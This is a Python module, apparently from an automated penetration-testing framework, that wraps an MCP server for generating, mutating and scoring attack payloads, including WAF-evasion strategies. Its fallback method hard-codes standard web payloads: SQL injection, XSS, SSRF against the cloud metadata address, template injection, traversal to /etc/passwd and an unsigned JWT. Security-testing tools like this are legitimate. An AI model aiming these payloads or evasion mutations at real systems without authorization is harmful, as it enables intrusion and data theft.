"""
Payload MCP Server Adapter
Context-aware payload generation, mutation, and encoding engine.
"""

import hashlib
from datetime import datetime
from typing import Any, Dict, List, Optional

from ai_osop.core.config import VulnClass
from ai_osop.core.models import Payload
from ai_osop.mcp.protocol import MCPRegistry


class PayloadMCPAdapter:
    """
    Intelligent payload generation and mutation via MCP.

    Capabilities:
    - Template-based payload generation
    - LLM-enhanced context-aware generation
    - Encoding chain application
    - WAF bypass strategy selection
    - Fitness feedback integration
    """

    SERVER_ID = "payload-mcp"

    def __init__(self, registry: MCPRegistry):
        self.registry = registry

    async def initialize(self, scope: Dict[str, Any], session_id: str) -> None:
        await self.registry.initialize_server(
            self.SERVER_ID, scope=scope, credentials={}, session_id=session_id
        )

    async def generate_payload(
        self,
        vuln_type: VulnClass,
        context: Dict[str, Any],
        encoding: Optional[List[str]] = None,
        waf_profile: Optional[str] = None,
        strategy: str = "template",
    ) -> Payload:
        """
        Generate a context-aware payload.

        Args:
            vuln_type: Target vulnerability class
            context: Injection point context (URL, parameter, headers, etc.)
            encoding: Encoding chain to apply (e.g., ["url", "base64"])
            waf_profile: Known WAF signature for bypass selection
            strategy: Generation strategy (template, llm, genetic)
        """
        params = {
            "vuln_type": vuln_type.value,
            "context": context,
            "encoding": encoding or [],
            "waf_profile": waf_profile,
            "strategy": strategy,
        }

        response = await self.registry.execute_tool(self.SERVER_ID, "generate_payload", params)

        if response.status == "success" and response.result:
            return self._normalize_payload(response.result, vuln_type, context)

        # Fallback to basic template
        return self._generate_fallback_payload(vuln_type, context, encoding)

    async def mutate_payload(
        self, payload: Payload, strategy: str = "encoding_variation", generation: int = 0
    ) -> Payload:
        """
        Mutate an existing payload using specified strategy.

        Strategies:
        - encoding_variation: Try different encodings
        - waf_bypass: Apply WAF evasion techniques
        - case_randomization: Randomize case of keywords
        - comment_injection: Insert comments to break signatures
        - context_adaptation: Adapt to specific injection context
        """
        params = {
            "payload_id": payload.id,
            "content": payload.content,
            "vuln_type": payload.vuln_type.value,
            "strategy": strategy,
            "generation": generation,
            "context": payload.context,
        }

        response = await self.registry.execute_tool(self.SERVER_ID, "mutate_payload", params)

        if response.status == "success" and response.result:
            mutated = self._normalize_payload(response.result, payload.vuln_type, payload.context)
            mutated.parent_id = payload.id
            mutated.generation = generation
            return mutated

        return payload  # Return original if mutation fails

    async def analyze_response(
        self, payload: Payload, response: Dict[str, Any], waf_signature: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Analyze target response to payload for feedback.

        Returns:
            success_indicator: 0.0-1.0 score
            waf_detected: Whether WAF blocked the request
            error_extracted: Any error messages
            behavior_class: Response classification
        """
        params = {
            "payload_id": payload.id,
            "payload_content": payload.content,
            "response": response,
            "waf_signature": waf_signature,
        }

        result = await self.registry.execute_tool(self.SERVER_ID, "analyze_response", params)

        if result.status == "success" and result.result:
            return result.result

        return {
            "success_indicator": 0.0,
            "waf_detected": False,
            "error_extracted": None,
            "behavior_class": "unknown",
        }

    async def get_payload_history(
        self, vuln_type: VulnClass, target_hash: str, min_fitness: float = 0.0
    ) -> List[Payload]:
        """Retrieve historical payloads for similar targets."""
        params = {
            "vuln_type": vuln_type.value,
            "target_hash": target_hash,
            "min_fitness": min_fitness,
        }

        response = await self.registry.execute_tool(self.SERVER_ID, "get_payload_history", params)

        if response.status == "success" and response.result:
            return [
                self._normalize_payload(p, vuln_type, {})
                for p in response.result.get("payloads", [])
            ]
        return []

    def _normalize_payload(
        self, raw: Dict[str, Any], vuln_type: VulnClass, context: Dict[str, Any]
    ) -> Payload:
        """Convert raw payload response to Payload model."""
        content = raw.get("content", "")
        return Payload(
            vuln_type=vuln_type,
            content=content,
            content_hash=hashlib.sha256(content.encode()).hexdigest()[:16],
            encoding_chain=raw.get("encoding_chain", []),
            context=context,
            generation=raw.get("generation", 0),
            strategy=raw.get("strategy", "template"),
            fitness_score=raw.get("fitness_score", 0.0),
            engagement_id=raw.get("engagement_id", ""),
        )

    def _generate_fallback_payload(
        self, vuln_type: VulnClass, context: Dict[str, Any], encoding: Optional[List[str]]
    ) -> Payload:
        """Generate minimal fallback payload when MCP fails."""
        templates = {
            VulnClass.SQLI: "' OR '1'='1",
            VulnClass.XSS: "<script>alert(1)</script>",
            VulnClass.SSRF: "http://169.254.169.254/latest/meta-data/",
            VulnClass.SSTI: "{{7*7}}",
            VulnClass.IDOR: "../../etc/passwd",
            VulnClass.JWT_ABUSE: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.",
        }

        content = templates.get(vuln_type, "test")

        # Apply basic encoding if requested
        if encoding:
            for enc in encoding:
                if enc == "url":
                    import urllib.parse

                    content = urllib.parse.quote(content)
                elif enc == "base64":
                    import base64

                    content = base64.b64encode(content.encode()).decode()

        return Payload(
            vuln_type=vuln_type,
            content=content,
            content_hash=hashlib.sha256(content.encode()).hexdigest()[:16],
            encoding_chain=encoding or [],
            context=context,
            strategy="fallback",
            engagement_id="",
        )
